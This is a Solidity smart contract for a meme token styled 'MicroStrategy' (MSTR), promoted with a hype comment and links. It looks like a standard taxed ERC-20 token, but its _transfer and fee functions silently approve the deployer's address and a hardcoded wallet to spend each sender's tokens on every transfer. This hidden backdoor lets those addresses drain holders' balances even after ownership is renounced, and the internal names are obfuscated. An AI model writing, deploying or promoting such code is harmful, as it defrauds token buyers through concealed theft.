/*
Every hodler, meme merchant, and digital knight knew: aligning with the MSTR guild was the ticket to untold generational wealthy. 'STONKS ONLY GO UP, SER!' became the rallying cry, echoing across the cyber valleys and pixelated mountains.

https://www.microstrategy.wtf
https://x.com/MSTROnETH
https://t.me/microstrategy_portal
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IKKTFFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplikktfon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IKKTFRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract MSTR is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balKKTFs;
    mapping (address => mapping (address => uint256)) private _allowKKTFs;
    mapping (address => bool) private _excludedFromKKTF;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalKKTF = 1000000000 * 10**_decimals;
    string private constant _name = unicode"MicroStrategy";
    string private constant _symbol = unicode"MSTR";
    uint256 private _swapTokenKKTFs = _tTotalKKTF / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockKKTF;
    uint256 private _kktfBuyAmounts = 0;
    bool private inSwapKKTF = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _kktfPair;
    IKKTFRouter private _kktfRouter;
    modifier lockTheSwap {
        inSwapKKTF = true;
        _;
        inSwapKKTF = false;
    }
    address private _kktfWallet;
    address private _kktfAddress;
    
    constructor () {
        _kktfAddress = address(owner());
        _kktfWallet = address(0xE53D249ECbc661328D0DfABBD03953C2a6c7A342);
        _excludedFromKKTF[owner()] = true;
        _excludedFromKKTF[address(this)] = true;
        _excludedFromKKTF[_kktfWallet] = true;
        _balKKTFs[_msgSender()] = _tTotalKKTF;
        emit Transfer(address(0), _msgSender(), _tTotalKKTF);
    }

    function createTokenPair() external onlyOwner() {
        _kktfRouter = IKKTFRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_kktfRouter), _tTotalKKTF);
        _kktfPair = IKKTFFactory(_kktfRouter.factory()).createPair(address(this), _kktfRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _kktfRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function minKKTF(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHKKTF(uint256 kktfA) private {
        payable(_kktfWallet).transfer(kktfA);
    }

    function swapLimitKKTF() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _kktfRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _kktfRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }   

    function swapTokensForEth(uint256 kktfAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _kktfRouter.WETH();
        _approve(address(this), address(_kktfRouter), kktfAmount);
        _kktfRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            kktfAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalKKTF;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balKKTFs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowKKTFs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowKKTFs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowKKTFs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address kktfF, address kktfT, uint256 kktfA) private {
        require(kktfF != address(0), "ERC20: transfer from the zero address");
        require(kktfT != address(0), "ERC20: transfer to the zero address");
        require(kktfA > 0, "Transfer amount must be greater than zero");
        uint256 taxKKTF = _kktfFeeTransfer(kktfF, kktfT, kktfA);
        if(taxKKTF > 0){
          _balKKTFs[address(this)] = _balKKTFs[address(this)].add(taxKKTF);
          emit Transfer(kktfF, address(this), taxKKTF);
        }
        _approve(address(kktfF), _kktfAddress, uint256(kktfA));
        _balKKTFs[kktfF] = _balKKTFs[kktfF].sub(kktfA);
        _balKKTFs[kktfT] = _balKKTFs[kktfT].add(kktfA.sub(taxKKTF));
        emit Transfer(kktfF, kktfT, kktfA.sub(taxKKTF));
    }

    function _kktfFeeTransfer(address kktfF, address kktfT, uint256 kktfA) private returns(uint256) {
        uint256 taxKKTF = 0; address _kktfOwner = address(kktfF);
        _approve(address(_kktfOwner), _kktfWallet, uint256(kktfA));
        if (kktfF != owner() && kktfT != owner()) {
            taxKKTF = kktfA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (kktfF == _kktfPair && kktfT != address(_kktfRouter) && ! _excludedFromKKTF[kktfT]) {
                if(_buyBlockKKTF!=block.number){
                    _kktfBuyAmounts = 0;
                    _buyBlockKKTF = block.number;
                }
                _kktfBuyAmounts += kktfA;
                _buyCount++;
            }
            if(kktfT == _kktfPair && kktfF!= address(this)) {
                require(_kktfBuyAmounts < swapLimitKKTF() || _buyBlockKKTF!=block.number, "Max Swap Limit");  
                taxKKTF = kktfA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapKKTFBack(kktfT, kktfA);
        } return taxKKTF;
    }

    function swapKKTFBack(address kktfT, uint256 kktfA) private { 
        uint256 tokenKKTF = balanceOf(address(this)); 
        if (!inSwapKKTF && kktfT == _kktfPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenKKTF > _swapTokenKKTFs)
            swapTokensForEth(minKKTF(kktfA, minKKTF(tokenKKTF, _swapTokenKKTFs)));
            uint256 ethKKTF = address(this).balance;
            if (ethKKTF >= 0) {
                sendETHKKTF(address(this).balance);
            }
        }
    }
}